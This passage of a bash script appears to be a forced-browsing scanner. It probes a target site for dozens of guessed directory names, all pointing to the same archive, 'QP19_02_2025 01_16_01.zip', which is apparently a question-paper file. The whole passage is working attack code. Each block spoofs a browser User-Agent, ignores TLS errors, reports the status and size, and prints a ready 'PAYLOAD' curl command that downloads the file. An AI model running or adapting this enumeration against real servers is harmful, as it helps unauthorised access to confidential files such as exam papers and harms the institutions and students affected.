code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
